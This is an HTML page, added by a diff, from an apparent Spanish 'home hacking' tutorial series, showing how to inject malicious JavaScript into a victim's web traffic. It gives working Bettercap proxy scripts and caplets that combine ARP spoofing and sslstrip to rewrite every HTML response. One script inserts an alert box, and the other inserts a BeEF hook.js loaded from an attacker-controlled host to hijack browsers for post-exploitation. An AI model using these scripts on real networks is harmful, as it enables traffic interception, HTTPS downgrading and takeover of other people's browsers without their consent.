@@ -1,0 +1,505 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.1.0">
+    
+    
+      
+        <title>POC: Inyectando Javscript Malicioso - Hacking Doméstico</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/application.11e41852.css">
+      
+      
+    
+    
+      <script src="../assets/javascripts/modernizr.20ef595d.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
+    
+    
+    
+  </head>
+  
+    <body dir="ltr">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#poc-inyectar-javascript-malicioso" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href=".." title="Hacking Doméstico" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                Hacking Doméstico
+              </span>
+              <span class="md-header-nav__topic">
+                POC: Inyectando Javscript Malicioso
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href=".." title="Hacking Doméstico" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    Hacking Doméstico
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href=".." title="Index" class="md-nav__link">
+      Index
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../introduccion/" title="Introducción" class="md-nav__link">
+      Introducción
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../raspberry/" title="Preparando el arsenal" class="md-nav__link">
+      Preparando el arsenal
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../informationGathering/" title="Recolección de información" class="md-nav__link">
+      Recolección de información
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../vulnerabilities/" title="Analizando las redes Wifi" class="md-nav__link">
+      Analizando las redes Wifi
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../crackingWifi/" title="Cracking de  redes Wifi" class="md-nav__link">
+      Cracking de  redes Wifi
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../networkAttack/" title="Explorando la red interna" class="md-nav__link">
+      Explorando la red interna
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        POC: Inyectando Javscript Malicioso
+      </label>
+    
+    <a href="./" title="POC: Inyectando Javscript Malicioso" class="md-nav__link md-nav__link--active">
+      POC: Inyectando Javscript Malicioso
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#inyeccion-de-javascript" title="Inyección de Javascript" class="md-nav__link">
+    Inyección de Javascript
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#beef-browser-explotation-framework" title="Beef: Browser Explotation Framework" class="md-nav__link">
+    Beef: Browser Explotation Framework
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#inyeccion-de-javascript" title="Inyección de Javascript" class="md-nav__link">
+    Inyección de Javascript
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#beef-browser-explotation-framework" title="Beef: Browser Explotation Framework" class="md-nav__link">
+    Beef: Browser Explotation Framework
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="poc-inyectar-javascript-malicioso">POC: Inyectar Javascript malicioso</h1>
+<p>Javascript es un lenguaje de programación utilizado en programación web que se ejecuta de lado del cliente, es decir, cualquier acción realizada en Javascript tendrá un reflejo en los equipos de aquellas personas que visiten la página web.</p>
+<p>Aprovechando esta caracterísitca de Javascript podemos inyectar un fichero Javascript (que contiene código malicioso) dentro de las peticiones HTTP para poder realizar diferentes acciones (<a href="https://www.europapress.es/portaltic/internet/noticia-the-pirate-bay-utiliza-cpu-usuarios-deshacerse-anuncios-mineria-criptomoneda-20170918140205.html">como minar criptomonedas</a>)</p>
+<h2 id="inyeccion-de-javascript">Inyección de Javascript</h2>
+<p>Para poder inyectar Javascript dentro de las peticiones, tendremos que realizar un ataque de arp spoofing, de forma que podemos realizar tratamiento de dichos paquetes.</p>
+<p>Posteiormente lo que tenemos que realizar es montar un proxy http/https, de forma que todas las peticiones de nuestro objetivo pasen por este y queden infectadas.</p>
+<p>Para poder modificar las peticiones usaremos el proxy http de bettercap. En primer lugar usaremos un código Javascript de ejemplo.</p>
+<pre><code>function onLoad(){
+   log(&quot;Script loaded..&quot;);
+}
+
+function onResponse(req,res){
+
+ if (res.ContentType.indexOf('text/html') == 0){
+
+    var body = res.ReadBody();
+
+     res.Body = body.replace(
+     '&lt;/head&gt;',
+     '&lt;script type=&quot;text/javascript&quot;&gt;alert(\&quot;@cyberh99 wa    s here\&quot;)&lt;/script&gt;&lt;/head&gt;'
+     );
+    }
+
+}        
+</code></pre>
+
+<p><a href="">injectionJS.js</a></p>
+<p>Este código Javascript realiza una acción muy sencilla, se encarga de reemplarar la etiqueta <em>head</em> del código html de cualquier página agregando una sencilla ventana que dice "@cyberh99 was here". Con esto podemos comprobar como funcionala inyección de Javascript.</p>
+<p>Dentro del código encontramos dos funciones, las cuales <em>tienen que estar para el funcionamiento del script</em>, estas tienen la siguiente relevancia:</p>
+<ul>
+<li>onLoad() --&gt; Se ejecuta cuando el script se cargca</li>
+<li>onResponse(req,res) --&gt; Se ejecuta una vez se envía el paquete al servidor real y se recibe respuesta</li>
+</ul>
+<p>Una vez que tenemos el código Javascript malicioso simplemente crearemos nuestro caplet para ejecutar Bettercap:</p>
+<pre><code>set http.proxy.script injectionJS.js
+set https.proxy.script injectionJS.js
+
+set http.proxy.sslstrip true
+set https.proxy.sslstrip true
+
+http.proxy on
+https.proxy on
+
+</code></pre>
+
+<p><a href="">injectionTest.cap</a></p>
+<h2 id="beef-browser-explotation-framework">Beef: Browser Explotation Framework</h2>
+<p>El código Javascript que hemos inyectado es muy simple, para una mera demostración, sin embargo, podemos hacer cosas mucho más complejas, un ejemplo de ello es Beef.</p>
+<p>Beef (Browser Explotation Framework) es una herramienta que nos ofrece la opción de infectar diferentes navegadores con código javascript, de forma que podamos realizar acciones sobre la máquina infectada. Este framework puede estar conectado con Metasploit o ser utilizado para ingenieria social.</p>
+<p>Para poder inyectar el códgio javascript de beef utilizaremos el siguiente código:</p>
+<pre><code class="javascript">function onLoad() {
+    log( &quot;BeefInject loaded.&quot; );
+    log(&quot;targets: &quot; + env['arp.spoof.targets']);
+}
+
+function onResponse(req, res) {
+    if( res.ContentType.indexOf('text/html') == 0 ){
+        var body = res.ReadBody();
+        if( body.indexOf('&lt;/head&gt;') != -1 ) {
+            res.Body = body.replace( 
+                '&lt;/head&gt;', 
+                '&lt;script type=&quot;text/javascript&quot; src=&quot;http://10.0.2.15:3000/hook.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;' 
+            ); 
+        }
+    }
+}
+</code></pre>
+
+<p><a href="">beefJavascript.js</a></p>
+<pre><code>set http.proxy.script beefJavascript.js
+set https.proxy.script beefJavascript.js
+
+set http.proxy.sslstrip true
+set https.proxy.sslstrip true
+
+http.proxy on
+https.proxy on
+</code></pre>
+
+<p><a href="">beefInjection.cap</a></p>
+<p>Posteriormente disponemos de todo el potencial que nos ofrece beef para realizar acciones de post explotación.</p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../networkAttack/" title="Explorando la red interna" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Explorando la red interna
+              </span>
+            </div>
+          </a>
+        
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../assets/javascripts/application.9e1f3b71.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
+      
+    
+    
+      
+    
+  </body>
+</html>
